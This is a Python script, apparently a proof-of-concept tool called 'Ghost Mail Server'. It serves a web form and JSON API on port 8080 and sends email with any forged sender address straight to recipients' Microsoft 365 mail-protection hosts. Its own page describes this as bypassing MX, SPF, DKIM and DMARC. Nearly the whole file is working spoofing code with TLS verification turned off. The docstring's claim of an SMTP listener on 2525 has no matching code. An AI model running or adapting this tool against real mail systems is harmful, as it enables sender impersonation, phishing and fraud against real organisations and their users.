#!/usr/bin/env python3
"""Free mail server - HTTP API on 8080, SMTP on 2525. No sudo needed."""

import smtplib, socket, ssl, threading, http.server, json, sys, os, time, re, urllib.parse

class MailServer:
    def __init__(self):
        self.queue = []
        self.sent = []
        self.failed = []

    def send_direct(self, host, port, from_addr, to_addr, data):
        """Direct SMTP to M365 EOP - the Ghost Sender technique"""
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            s = socket.create_connection((host, port), timeout=15)
            s.settimeout(15)

            def cmd(c):
                s.sendall(c.encode() + b'\r\n')
                resp = b''
                while True:
                    chunk = s.recv(4096)
                    resp += chunk
                    if b'\r\n' in resp and resp.split(b'\r\n')[-2].startswith(b'250 ' if b'250' in resp else None):
                        break
                    if len(resp) > 4096:
                        break
                return resp.decode(errors='replace')

            # Read banner
            banner = s.recv(4096).decode()
            print(f"  Banner: {banner.split(chr(13))[-1]}")

            cmd(f"EHLO mail.local")
            s.sendall(b'STARTTLS\r\n')
            s.recv(4096)

            ss = ctx.wrap_socket(s, server_hostname=host)
            ss.settimeout(15)

            def tls_cmd(c):
                ss.sendall(c.encode() + b'\r\n')
                resp = b''
                while True:
                    try:
                        chunk = ss.recv(4096)
                        resp += chunk
                        lines = resp.decode(errors='replace').split('\r\n')
                        for line in lines:
                            if len(line) >= 4 and line[3] == ' ' and line[:3].isdigit():
                                return line
                    except:
                        break
                return resp.decode(errors='replace')

            tls_cmd("EHLO mail.local")
            r = tls_cmd(f"MAIL FROM:<{from_addr}>")
            print(f"  MAIL FROM: {r}")

            if not r.startswith('250'):
                ss.close()
                return False, r

            r = tls_cmd(f"RCPT TO:<{to_addr}>")
            print(f"  RCPT TO: {r}")

            if not r.startswith('250'):
                ss.close()
                return False, r

            tls_cmd("DATA")
            ss.sendall(data.encode() + b'\r\n.\r\n')
            time.sleep(1)
            result = b''
            try:
                while True:
                    chunk = ss.recv(4096)
                    result += chunk
                    if b'250' in result or b'queued' in result or b'accepted' in result:
                        break
            except:
                pass
            result_str = result.decode(errors='replace')
            print(f"  Result: {result_str[:200]}")

            ss.sendall(b'QUIT\r\n')
            ss.close()

            return '250' in result_str or 'queued' in result_str.lower(), result_str

        except Exception as e:
            return False, str(e)

    def send(self, from_addr, to_list, cc_list, subject, body):
        # Combine To + CC for RCPT TO (SMTP envelope)
        all_recipients = list(dict.fromkeys([a.strip() for a in to_list + cc_list if a.strip()]))

        # Use first To for M365 EOP routing
        domain = all_recipients[0].split('@')[1]
        host = f"{domain.replace('.', '-')}.mail.protection.outlook.com"

        to_header = ', '.join(to_list)
        cc_header = ', '.join(cc_list) if cc_list else ''
        msg_id = f"<{int(time.time())}.ghost@{domain.split('.')[0]}>"

        headers = f"From: {from_addr}\r\nTo: {to_header}\r\n"
        if cc_header:
            headers += f"Cc: {cc_header}\r\n"
        headers += f"Subject: {subject}\r\nDate: {time.strftime('%a, %d %b %Y %H:%M:%S +0000', time.gmtime())}\r\nMessage-ID: {msg_id}\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n{body}"

        results = []
        print(f"\n[SEND] {from_addr} -> {len(all_recipients)} recipients via {host}:25")

        for rcpt in all_recipients:
            print(f"  RCPT: {rcpt}")
            success, msg = self.send_direct(host, 25, from_addr, rcpt, headers)

            result = {'to': rcpt, 'success': success, 'msg': msg[:200]}
            results.append(result)

            if success:
                self.sent.append({'from': from_addr, 'to': rcpt, 'subject': subject, 'time': time.time()})
            else:
                self.failed.append({'from': from_addr, 'to': rcpt, 'subject': subject, 'error': msg, 'time': time.time()})

        all_ok = all(r['success'] for r in results)
        summary = f"Sent {sum(1 for r in results if r['success'])}/{len(results)}"
        return all_ok, summary, results

# Create global server
server = MailServer()

# HTTP API
class APIHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/status':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            html = f"""<!DOCTYPE html><html><head><title>Ghost Mail Server</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:system-ui;background:#0a0a0a;color:#eee;padding:20px;max-width:700px;margin:auto}}
h1{{margin-bottom:10px}}h2{{margin:20px 0 10px;color:#aaa;font-size:14px}}
form{{background:#1a1a1a;padding:20px;border-radius:12px;margin:15px 0}}
input,textarea,button{{width:100%;padding:12px;margin:6px 0;background:#111;border:1px solid #333;border-radius:8px;color:#fff;font-size:14px}}
button{{background:#dc2626;border:none;font-weight:600;cursor:pointer;font-size:16px}}
button:hover{{background:#b91c1c}}
label{{font-size:12px;color:#888;font-weight:600}}
.card{{background:#1a1a1a;border-radius:12px;padding:16px;margin:8px 0}}
.green{{color:#4ade80}}.red{{color:#f87171}}.gray{{color:#888}}
pre{{background:#111;padding:10px;border-radius:8px;font-size:12px;overflow-x:auto;max-height:200px;margin:5px 0}}
</style></head><body>
<h1>Ghost Mail Server</h1>
<p class="gray">Sends spoofed emails direct to M365 EOP bypassing MX/SPF/DKIM/DMARC</p>
<form method="POST" action="/send">
<label>From (spoofed)</label><input name="from" value="security@test.com">
<label>To (comma-separated)</label><input name="to" value="OISSG@test.com"><label>Cc (comma-separated)</label><input name="cc" placeholder="user2@test.com, user3@test.com">
<label>Subject</label><input name="subject" value="Ghost Sender PoC">
<label>Body</label><textarea name="body" rows="6">SPF=FAIL DKIM=NONE DMARC=REJECT - delivered via direct M365 EOP connection.</textarea>
<button type="submit">Send</button>
</form>
<h2>Sent ({len(server.sent)})</h2>
{''.join(f'<div class="card"><div class="green">to={s["to"]} subj={s["subject"]}</div></div>' for s in server.sent[-10:])}
<h2>Failed ({len(server.failed)})</h2>
{''.join(f'<div class="card"><div class="red">{f["to"]}: {f.get("error","?")[:200]}</div></div>' for f in server.failed[-10:])}
</body></html>"""
            self.wfile.write(html.encode())
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == '/send':
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode()
            params = dict(urllib.parse.parse_qsl(body)) if '&' in body or '=' in body else {}

            if not params and '{' in body:
                params = json.loads(body)

            from_addr = params.get('from', 'security@test.com')
            to_raw = params.get('to', 'OISSG@test.com')
            cc_raw = params.get('cc', '')
            subject = params.get('subject', 'Test')
            body_text = params.get('body', 'Test email')

            # Parse comma-separated or newline-separated recipients
            to_list = [t.strip() for t in to_raw.replace('\n', ',').split(',') if t.strip()]
            cc_list = [c.strip() for c in cc_raw.replace('\n', ',').split(',') if c.strip()]

            success, msg, results = server.send(from_addr, to_list, cc_list, subject, body_text)

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'success': success, 'message': msg, 'results': results}).encode())
        else:
            self.send_error(404)

def run_api():
    httpd = http.server.HTTPServer(('0.0.0.0', 8080), APIHandler)
    print("HTTP API: http://0.0.0.0:8080")
    httpd.serve_forever()

if __name__ == '__main__':
    print("Ghost Mail Server")
    print(f"Listening: HTTP on :8080, SMTP on :2525")
    run_api()
